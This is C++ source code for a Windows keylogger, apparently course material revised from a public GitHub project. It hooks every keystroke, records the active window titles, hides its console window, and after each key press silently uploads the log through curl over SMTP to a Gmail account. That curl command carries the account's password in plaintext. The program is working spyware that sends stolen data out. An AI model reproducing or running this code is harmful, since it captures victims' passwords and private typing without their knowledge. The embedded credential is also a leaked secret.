// https://github.com/GiacomoLaw/Keylogger
// Revised by Xinwen Fu

#include <Windows.h>
#include <time.h>
#include <iostream>
#include <cstdio>
#include <fstream>

// defines whether the window is visible or not
// should be solved with makefile, not in this file
#define invisible // (visible / invisible)

// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
// or you will get problems since every function uses this variable.
HHOOK _hook;

// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.
KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);
std::ofstream OUTPUT_FILE;

char lastwindow[256];

// This is the callback function. Consider it the event that is raised when, in this case, 
// a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		// the action is valid: HC_ACTION.
		if (wParam == WM_KEYDOWN)
		{
			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

			// save to file
			Save(kbdStruct.vkCode);
		}
	}

	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{

	static wchar_t* wString = new wchar_t[50], * wStringE = new wchar_t[50];
	// Set the hook and set it to use the callback function above
	// WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
	// function that sets and releases the hook.
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		MultiByteToWideChar(CP_ACP, 0, "Failed to install hook!", -1, wString, 4096);
		MultiByteToWideChar(CP_ACP, 0, "Error!", -1, wStringE, 4096);
		MessageBox(NULL, wString, wStringE, MB_ICONERROR);
	}
}

void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke)
{
	if ((key_stroke == 1) || (key_stroke == 2))
		return 0; // ignore mouse clicks

	HWND foreground = GetForegroundWindow();
	// The foreground window can be NULL in certain circumstances, such as when a window is losing activation.
	if (!foreground) return 0;

	DWORD threadID;
	HKL layout;

	threadID = GetWindowThreadProcessId(foreground, NULL);
	layout = GetKeyboardLayout(threadID);

	char window_title[256];
	GetWindowTextA(foreground, (LPSTR)window_title, 256);

	if (strcmp(window_title, lastwindow) != 0) {
		strcpy_s(lastwindow, sizeof lastwindow, window_title);
		struct tm buf;
		time_t t = time(NULL);
		localtime_s(&buf, &t);
		struct tm* tm = &buf;
		char s[64];
		strftime(s, sizeof(s), "%c", tm);
		OUTPUT_FILE << "\n\n[Window: " << window_title << " - at " << s << "] ";
	}

	std::cout << key_stroke << '\n';

	switch (key_stroke) {
	case VK_BACK:
		OUTPUT_FILE << "[BACKSPACE]";
		break;
	case VK_RETURN:
		OUTPUT_FILE << "\n";
	case VK_SPACE:
		OUTPUT_FILE << " ";
		break;
	case VK_TAB:
		OUTPUT_FILE << "[TAB]";
		break;
	case VK_SHIFT:
	case VK_LSHIFT:
	case VK_RSHIFT:
		OUTPUT_FILE << "[SHIFT]";
		break;
	case VK_CONTROL:
	case VK_LCONTROL:
	case VK_RCONTROL:
		OUTPUT_FILE << "[CONTROL]";
		break;
	case VK_ESCAPE:
		OUTPUT_FILE << "[ESCAPE]";
		break;
	case VK_END:
		OUTPUT_FILE << "[END]";
		break;
	case VK_HOME:
		OUTPUT_FILE << "[HOME]";
		break;
	case VK_LEFT:
		OUTPUT_FILE << "[LEFT]";
		break;
	case VK_UP:
		OUTPUT_FILE << "[UP]";
	case VK_RIGHT:
		OUTPUT_FILE << "[RIGHT]";
		break;
	case VK_DOWN:
		OUTPUT_FILE << "[DOWN]";
		break;
	case 110:
	case VK_OEM_PERIOD: // 190
		OUTPUT_FILE << ".";
		break;
	case VK_OEM_MINUS:
	case 109:
		OUTPUT_FILE << "-";
		break;
	case VK_CAPITAL:
		OUTPUT_FILE << "[CAPSLOCK]";
		break;
	case VK_LWIN:
	case VK_RWIN:
		OUTPUT_FILE << "[WINKEY]";
		break;
	case VK_F1:
		OUTPUT_FILE << "[F1]";
		break;
	case VK_F2:
		OUTPUT_FILE << "[F2]";
		break;
	case VK_F3:
		OUTPUT_FILE << "[F3]";
		break;
	case VK_F4:
		OUTPUT_FILE << "[F4]";
		break;
	case VK_F5:
		OUTPUT_FILE << "[F5]";
		break;
	case VK_F6:
		OUTPUT_FILE << "[F6]";
		break;
	case VK_F7:
		OUTPUT_FILE << "[F7]";
		break;
	case VK_F8:
		OUTPUT_FILE << "[F8]";
		break;
	case VK_F9:
		OUTPUT_FILE << "[F9]";
		break;
	case VK_F10:
		OUTPUT_FILE << "[F10]";
		break;
	case VK_F11:
		OUTPUT_FILE << "[F11]";
		break;
	case VK_F12:
		OUTPUT_FILE << "[F12]";
		break;
	case VK_F13:
		OUTPUT_FILE << "[F13]";
		break;
	case VK_F14:
		OUTPUT_FILE << "[F14]";
		break;
	case VK_F15:
		OUTPUT_FILE << "[F15]";
		break;
	case VK_F16:
		OUTPUT_FILE << "[F16]";
		break;
	case VK_F17:
		OUTPUT_FILE << "[F17]";
		break;
	case VK_F18:
		OUTPUT_FILE << "[F18]";
		break;
	case VK_F19:
		OUTPUT_FILE << "[F19]";
		break;
	case VK_F20:
		OUTPUT_FILE << "[F20]";
		break;
	case VK_F21:
		OUTPUT_FILE << "[F21]";
		break;
	case VK_F22:
		OUTPUT_FILE << "[F23]";
		break;
	case VK_F24:
		OUTPUT_FILE << "[F24]";
		break;
	case VK_NUMLOCK:
		OUTPUT_FILE << "[NUMLOCK]";
		break;
	case VK_SCROLL:
		OUTPUT_FILE << "[SCROLLLOCK]";
		break;
	case VK_LMENU:
	case VK_RMENU:
		OUTPUT_FILE << "[ALT]";
		break;
	case VK_BROWSER_BACK:
		OUTPUT_FILE << "[BROWSER BACK]";
		break;
	case VK_BROWSER_FORWARD:
		OUTPUT_FILE << "[BROWSER FORWARD]";
		break;
	case VK_BROWSER_REFRESH:
		OUTPUT_FILE << "[BROWSER REFRESH]";
		break;
	case VK_BROWSER_STOP:
		OUTPUT_FILE << "[BROWSER STOP]";
		break;
	case VK_BROWSER_SEARCH:
		OUTPUT_FILE << "[BROWSER SEARCH]";
		break;
	case VK_BROWSER_FAVORITES:
		OUTPUT_FILE << "[BROWSER FAVORITES]";
		break;
	case VK_BROWSER_HOME:
		OUTPUT_FILE << "[BROWSER HOME]";
		break;
	case VK_VOLUME_MUTE:
		OUTPUT_FILE << "[VOLUME MUTE]";
		break;
	case VK_VOLUME_DOWN:
		OUTPUT_FILE << "[VOLUME DOWN]";
		break;
	case VK_VOLUME_UP:
		OUTPUT_FILE << "[VOLUME UP]";
		break;
	case VK_MEDIA_NEXT_TRACK:
		OUTPUT_FILE << "[NEXT TRACK]";
		break;
	case VK_MEDIA_PREV_TRACK:
		OUTPUT_FILE << "[PREV TRACK]";
		break;
	case VK_MEDIA_STOP:
		OUTPUT_FILE << "[STOP TRACK]";
		break;
	case VK_MEDIA_PLAY_PAUSE:
		OUTPUT_FILE << "[Play/Pause TRACK]";
		break;
	case VK_LAUNCH_MAIL:
		OUTPUT_FILE << "[LAUNCH MAIL]";
		break;
	case VK_LAUNCH_MEDIA_SELECT:
		OUTPUT_FILE << "[LAUNCH SELECT MEDIA]";
		break;
	case VK_LAUNCH_APP1:
	case VK_LAUNCH_APP2:
		OUTPUT_FILE << "[LAUNCH APP]";
		break;
	case VK_ATTN:
		OUTPUT_FILE << "[ATTN]";
		break;
	case VK_CRSEL:
		OUTPUT_FILE << "[CRSEL]";
		break;
	case VK_EXSEL:
		OUTPUT_FILE << "[EXSEL]";
		break;
	case VK_EREOF:
		OUTPUT_FILE << "[ERASE EOF]";
		break;
	case VK_PLAY:
		OUTPUT_FILE << "[PLAY]";
		break;
	case VK_ZOOM:
		OUTPUT_FILE << "[ZOOM]";
		break;
	case VK_PA1:
		OUTPUT_FILE << "[PA1]";
		break;
	case VK_CLEAR:
		OUTPUT_FILE << "[CLEAR]";
		break;
	case VK_MENU:
		OUTPUT_FILE << "[ALT]";
		break;
	default:
		char key;
		// check caps lock
		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		// check shift key
		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
			lowercase = !lowercase;
		}

		//map virtual key according to keyboard layout 
		if (foreground)
			key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

		//tolower converts it to lowercase properly
		if (!lowercase) key = tolower(key);
		OUTPUT_FILE << char(key);
		break;
	}


	//instead of opening and closing file handlers every time, keep file open and flush.
	OUTPUT_FILE.flush();

	const char* command = "./curl smtps://smtp.gmail.com:465 -v --mail-from \"ucfcap4145@gmail.com\" --mail-rcpt \"ucfcap4145@gmail.com\" --ssl --user \"ucfcap4145@gmail.com:cap4145@ucf\" --upload-file \"System32Log.txt\" -k --anyauth";
	WinExec(command, SW_HIDE);

	return 0;
}

void Stealth()
{
#ifdef visible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
#endif // visible

#ifdef invisible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
	FreeConsole();
#endif // invisible
}

int main()
{

	//open output file in append mode
	OUTPUT_FILE.open("System32Log.txt", std::ios_base::app);

	//	time_t rawtime;
	//	char buffer[100];
	//	struct tm buf;

	// visibility of window
	Stealth();

	// Set the hook
	SetHook();

	// loop to keep the console application running.
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0));
	/*
	while (1) // Retrieves a message from the calling thread's message queue.
	{
		Sleep(60000);
		
		time(&rawtime);
		localtime_s(&buf, &rawtime);

		strftime(buffer, sizeof(buffer), "%S", &buf);

		const char * str(buffer);
//		printf("%s\n", str);

		if (strcmp(str, "01")==0) {

			const char* command = "./curl smtps://smtp.gmail.com:465 -v --mail-from \"ucfcap4145@gmail.com\" --mail-rcpt \"ucfcap4145@gmail.com\" --ssl --user \"ucfcap4145@gmail.com:cap4145@ucf\" --upload-file \"System32Log.txt\" -k --anyauth";
			WinExec(command, SW_HIDE);

		//}
	}
*/

	return 0;
}
